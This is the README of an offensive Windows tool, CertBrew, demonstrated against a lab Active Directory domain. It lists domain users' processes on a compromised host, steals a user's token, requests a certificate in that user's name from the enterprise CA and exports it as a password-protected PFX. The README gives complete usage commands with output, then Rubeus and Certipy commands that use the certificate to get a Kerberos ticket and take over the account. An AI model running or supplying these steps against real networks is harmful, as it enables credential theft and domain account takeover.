# CertBrew

```
 .\CertBrew.exe

   _.._..,_,_          ____          __  ____
  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __
   ]~,"-.-~~[        | |   / _ \ '__| __|  _ \| '__/ _ \ \ /\ / /
 .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\ V  V /
 | ]:: '    [         \____\___|_|   \__|____/|_|  \___| \_/\_/
 '=]): .)  ([
   |:: '    |            -- Made by Wuentin --
    ~~----~~

Usage:
  C:\Users\cersei.lannister\Desktop\CertBrew.exe /list
  C:\Users\cersei.lannister\Desktop\CertBrew.exe /steal /pid:<PID> /template:<Template> /ca:<CA> /pass:<password> [/outfile:file]
```

## Purpose

This tool aims to *impersonate* a logged-in domain user on a compromised host and request a certificate on their behalf. The certificate is password protected. 

Performing this operation requires *elevated privileges* on the machine.

## Usage
### List
```
.\CertBrew.exe /list

   _.._..,_,_          ____          __  ____
  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __
   ]~,"-.-~~[        | |   / _ \ '__| __|  _ \| '__/ _ \ \ /\ / /
 .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\ V  V /
 | ]:: '    [         \____\___|_|   \__|____/|_|  \___| \_/\_/
 '=]): .)  ([
   |:: '    |            -- Made by Wuentin --
    ~~----~~


[+] Scanning processes for domain user tokens...
PID      | USER                           | PROCESS
----------------------------------------------------------
2040     | SEVENKINGDOMS\cersei.lannister | rdpclip.exe
3392     | SEVENKINGDOMS\cersei.lannister | sihost.exe
3756     | SEVENKINGDOMS\cersei.lannister | svchost.exe
2528     | SEVENKINGDOMS\cersei.lannister | taskhostw.exe
2076     | SEVENKINGDOMS\cersei.lannister | ctfmon.exe
4044     | SEVENKINGDOMS\cersei.lannister | explorer.exe
```

### CertBrew
#### Base64 stdout 
```
.\CertBrew.exe /steal /pid:5060 /template:User /ca:"kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA" /pass:Fromage

   _.._..,_,_          ____          __  ____
  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __
   ]~,"-.-~~[        | |   / _ \ '__| __|  _ \| '__/ _ \ \ /\ / /
 .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\ V  V /
 | ]:: '    [         \____\___|_|   \__|____/|_|  \___| \_/\_/
 '=]): .)  ([
   |:: '    |            -- Made by Wuentin --
    ~~----~~

[*] Opening process PID: 5060
[*] Duplicating and impersonating user...
[+] Impersonation OK. Context: LaMontagne@SEVENKINGDOMS.LOCAL. Starting enrollment routine...
[*] Initializing COM library...
[*] Target UPN retrieved: LaMontagne@SEVENKINGDOMS.LOCAL
[*] Submitting request to CA: kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA
[*] Exporting PFX from memory store...
[+] PFX Base64 (password=Fromage):
MIIM+gIBAzCCDLYGCSqGSIb3DQEHAaCCDKcEggyjMIIMnzCCBggGCSqG...(snip)...dYGkebKwICB9A=
```

#### Pfx output
```
.\CertBrew.exe /steal /pid:5060 /template:User /ca:"kingslanding.sevenkingdoms.local\SEVENKINGDO
MS-CA" /pass:Fromage  /outfile:user.pfx

   _.._..,_,_          ____          __  ____
  (          )        / ___|___ _ __| |_| __ ) _ __ _____      __
   ]~,"-.-~~[        | |   / _ \ '__| __|  _ \| '__/ _ \ \ /\ / /
 .=])' (;  ([        | |__|  __/ |  | |_| |_) | | |  __/\ V  V /
 | ]:: '    [         \____\___|_|   \__|____/|_|  \___| \_/\_/
 '=]): .)  ([
   |:: '    |            -- Made by Wuentin --
    ~~----~~

[*] Opening process PID: 5060
[*] Duplicating and impersonating user...
[+] Impersonation OK. Context: LaMontagne@SEVENKINGDOMS.LOCAL. Starting enrollment routine...
[*] Initializing COM library...
[*] Target UPN retrieved: LaMontagne@SEVENKINGDOMS.LOCAL
[*] Submitting request to CA: kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA
[*] Exporting PFX from memory store...
[+] SUCCESS. Binary PFX saved to: user.pfx
```

### Post Exploitation
Once issued, the certificate may enable full user impersonation through certificate-based authentication (e.g., PKINIT), assuming the targeted account is configured to allow smart-card or certificate logon.

Two examples below with Rubeus or Certipy.
#### Rubeus
```
.\Rubeus.exe asktgt /domain:sevenkingdoms.local /createnetonly:C:\Windows\System32\cmd.exe /show /certificate:MIIM+gIBAzCCDLYGCSqGSIb3DQEHAaCCDKcEggyjMIIMnzCCBggGCSqG...(snip)...dYGkebKwICB9A=
 /password:Fromage /user:LaMontagne

.\Rubeus.exe asktgt /domain:sevenkingdoms.local /createnetonly:C:\Windows\System32\cmd.exe /show /certificate:user.pfx
 /password:Fromage /user:LaMontagne
```

#### Certipy
```
certipy cert -pfx user.pfx -password Fromage -export -out LaMontagne.pfx
certipy auth -pfx LaMontagne.pfx -dc-ip 192.168.10.10
```
